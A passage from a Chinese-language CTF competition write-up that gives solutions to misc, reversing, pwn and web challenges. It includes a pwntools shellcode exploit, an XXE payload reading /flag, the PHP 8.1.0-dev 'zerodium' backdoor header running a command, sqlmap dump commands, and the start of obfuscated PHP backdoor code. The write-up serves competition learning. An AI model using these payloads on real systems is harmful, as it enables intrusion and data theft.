number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token number\">106</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">90</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>hint <span class=\"token operator\">=</span><span class=\"token punctuation\">[</span> <span class=\"token number\">90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">121</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">120</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">65</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">97</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">66</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">98</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">67</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">99</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token number\">68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">101</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">102</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">103</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">104</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">105</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>         <span class=\"token number\">74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">107</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">108</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">109</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">110</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">111</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>         <span class=\"token number\">80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">112</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">113</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">114</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">115</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">117</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>         <span class=\"token number\">86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">118</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">119</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">48</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">49</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">50</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">51</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">52</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">53</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">54</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">55</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>         <span class=\"token number\">56</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">57</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">43</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">47</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    s<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s1 <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>hint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    k<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>hint<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>k1 <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>tableBase64 <span class=\"token operator\">=</span> <span class=\"token string\">\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>translated_s1 <span class=\"token operator\">=</span> s1<span class=\"token punctuation\">.</span>translate<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">.</span>maketrans<span class=\"token punctuation\">(</span>k1<span class=\"token punctuation\">,</span> tableBase64<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\"># 为了处理填充问题，计算缺少的填充字符数量</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>translated_s1<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">if</span> padding <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>  <span class=\"token comment\"># 如果不是 4 的倍数，添加缺少的 '='</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    translated_s1 <span class=\"token operator\">+=</span> <span class=\"token string\">\"=\"</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> padding<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote>\n<p>b’qsnctf{d0b1e37104739d71b92fb1a93aa8cf09}’</p>\n</blockquote>\n<h3 id=\"追光者\"><a class=\"markdownIt-Anchor\" href=\"#追光者\">#</a> 追光者</h3>\n<p>第一层压缩包是伪加密，winrar 修复压缩包后即可正常解压。</p>\n<p>formost 分离  <code>追光者.jpg</code>  ，得到一个压缩包。</p>\n<p>压缩包的注释</p>\n<pre><code>人们不愿意相信光是AB，人们更愿意相信光是AD。人们也不愿意相信，密码就在眼前，因为人们只愿相信自己愿意相信的，只愿看到自己想看到的……\n</code></pre>\n<p>用 winhex 打开 <code>追光者.jpg</code>  ，在  <code>追光者.jpg</code>  底部得到一个 hint（开始骂人）</p>\n<pre><code>提示：密码中的字符全为小写\n</code></pre>\n<p>搜  <code>JFIF</code>  发现另一个图片，formost 没把它分离出来。</p>\n<p><img data-src=\"/img/qsnctf_round1/m_1_1.png\" alt=\"m_1_1\"></p>\n<p>根据压缩包注释的提示，搜索  <code>AB</code>  ，高亮后可以看到密码</p>\n<p><img data-src=\"/img/qsnctf_round1/m_1_2.png\" alt=\"m_1_2\"></p>\n<p>抄写下来，得到</p>\n<pre><code>iamsthplay\n</code></pre>\n<p>但是这个密码不对！需要在后边加上 <code>er</code> ，而且还要把 <code>s</code>  改成 <code>5</code> 。（说好的 <code>密码中的字符全为小写</code> 呢？）</p>\n<pre><code>iam5thplayer\n</code></pre>\n<p>解压后，在 <code>txt</code>  文件里得到 flag 的前半段。</p>\n<p>发现新的压缩包里也有一个 <code>闪.jpg</code> ，明文爆破得到密码</p>\n<pre><code>G3r1ing!\n</code></pre>\n<p><img data-src=\"/img/qsnctf_round1/m_1_3.png\" alt=\"m_1_3\"></p>\n<p>解压后得到 flag 后半段的逆序，逆回来拼上前半段即可</p>\n<blockquote NE73R_G1V3_U1o=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h3 id=\"问卷\"><a class=\"markdownIt-Anchor\" href=\"#问卷\">#</a> 问卷</h3>\n<p>擂台赛下次明白了哈</p>\n<blockquote 青少年CTF蒸蒸日上=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"简单的数学题\"><a class=\"markdownIt-Anchor\" href=\"#简单的数学题\">#</a> 简单的数学题</h3>\n<blockquote da7787a8574e41f4807613358d77610a=\"\">\n<p>└─$ nc <span class=\"exturl\" data-url=\"aHR0cDovL2NoYWxsZW5nZS5xc25jdGYuY29t\">challenge.qsnctf.com</span> 30171<br>\n[*]Welcome! Please solve an equation.<br>\n[*]Challenge 1: 2*15^2-1/x+15-6=458.875 Please tell me the result of x.</p>\n<p>8</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> sympy <span class=\"token keyword\">import</span> symbols<span class=\"token punctuation\">,</span> Eq<span class=\"token punctuation\">,</span> solve</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>x <span class=\"token operator\">=</span> symbols<span class=\"token punctuation\">(</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>equation <span class=\"token operator\">=</span> Eq<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">*</span><span class=\"token number\">15</span><span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span>x <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">-</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">458.875</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>solution <span class=\"token operator\">=</span> solve<span class=\"token punctuation\">(</span>equation<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>[*]Challenge 2: 5+sqrt(x)=8 Please tell me the result of x.<br>\n[*]Hint: Sqrt means radical sign.</p>\n<p>9</p>\n<pre><code>直接看出来等于9\n</code></pre>\n<p>[*]Challenge 3: x<sup>10+2</sup>10-4*x=6131066258749 Please tell me the result of x.<br>\n19</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">func</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">return</span> x<span class=\"token operator\">**</span><span class=\"token number\">10</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">10</span> <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token operator\">*</span>x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>solution <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">while</span> func<span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">6131066258749</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>solution <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>[*]True! This problem is very simple! Right?!</p>\n<p>[*]Here you go, flag.<br>\nFLAG: qsnctf</p>\n</blockquote>\n<h3 id=\"easy_shellcode\"><a class=\"markdownIt-Anchor\" href=\"#easy_shellcode\">#</a> Easy_Shellcode</h3>\n<blockquote>\n<p>exp:</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'challenge.qsnctf.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30991</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>dz <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>dz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># gdb.attach(r)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>payload <span class=\"token operator\">+=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x108</span><span class=\"token operator\">-</span><span class=\"token number\">48</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>payload <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span>dz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>sl<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\"># pause()</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote 26030b3e3939d0dc5bec32153165ca2f=\"\">\n<p>qsnctf</p>\n</blockquote>\n<h2 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> web</h2>\n<h3 id=\"easymd5\"><a class=\"markdownIt-Anchor\" href=\"#easymd5\">#</a> EasyMD5</h3>\n<p>md5 强碰撞，用 <code>fastcoll</code>  生成两个 MD5 相同的 pdf 文件，上传后即可得到 flag。</p>\n<p><img data-src=\"/img/qsnctf_round1/w_1_1.png\" alt=\"w_1_1\"></p>\n<h3 id=\"php的xxe\"><a class=\"markdownIt-Anchor\" href=\"#php的xxe\">#</a> PHP 的 XXE</h3>\n<p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTYwNTM1Mi9hcnRpY2xlL2RldGFpbHMvMTE2NDk0MTEx\">[Vulhub] PHP 环境 XML 外部实体注入漏洞（XXE）</span></p>\n<p>访问 <code>dom.php</code>  即可开始 xxe</p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token prolog\">&lt;?xml version=\"1.0\" encoding=\"utf-8\"?></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token doctype\"><span class=\"token punctuation\">&lt;!</span><span class=\"token doctype-tag\">DOCTYPE</span> <span class=\"token name\">xxe</span><span class=\"token punctuation\">[</span><span class=\"token internal-subset\"> </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>!ELEMENT</span> <span class=\"token attr-name\">test</span> <span class=\"token attr-name\">ANY</span> <span class=\"token punctuation\">></span></span>\t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t&lt;!ENTITY xxe SYSTEM \"file:///flag\" ></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">></span></span>\t</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>test</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>name</span><span class=\"token punctuation\">></span></span><span class=\"token entity named-entity\" title=\"&xxe;\">&amp;xxe;</span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>name</span><span class=\"token punctuation\">></span></span>\t\t\t\t\t</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>test</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p><img data-src=\"/img/qsnctf_round1/w_2_1.png\" alt=\"w_2_1\"></p>\n<h3 id=\"php的后门\"><a class=\"markdownIt-Anchor\" href=\"#php的后门\">#</a> PHP 的后门</h3>\n<p>原题</p>\n<p>参考链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzYzMjUzMDQwL2FydGljbGUvZGV0YWlscy8xMjcwMzcwMjY=\">PHP/8.1.0-dev 后门命令执行漏洞复现</span></p>\n<p>http 头添加</p>\n<pre><code>User-Agentt:zerodiumsystem('cat /flag');\n</code></pre>\n<p><img data-src=\"/img/qsnctf_round1/w_3_1.png\" alt=\"w_3_1\"></p>\n<h3 id=\"easy_sqli\"><a class=\"markdownIt-Anchor\" href=\"#easy_sqli\">#</a> Easy_SQLi</h3>\n<p>sql 盲注，简单粗暴拿 sqlmap 梭出来</p>\n<pre><code>sqlmap -r 114.txt --batch --dbs\n</code></pre>\n<p>可以爆出一个 <code>qsnctf</code>  库</p>\n<pre><code>sqlmap -r 114.txt --batch -D qsnctf --dump\n</code></pre>\n<p>直接查看整个库，得到 flag</p>\n<p><img data-src=\"/img/qsnctf_round1/w_4_1.png\" alt=\"w_4_1\"></p>\n<h3 id=\"雏形系统\"><a class=\"markdownIt-Anchor\" href=\"#雏形系统\">#</a> 雏形系统</h3>\n<p>有 <code>www.zip</code> 。</p>\n<p>重点代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$O00OO0</span><span class=\"token operator\">=</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$O00O0O</span><span class=\"token operator\">=</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">3</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">6</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">33</span><span class=\"token punctuation\">&#125;</span><span class=\"token operator\">.</span><span class=\"token variable\">$O00OO0</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">30</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span><span class=\"token variable\">$O0OO00</span><span class=\"token operator\">=</span><span class=\"token 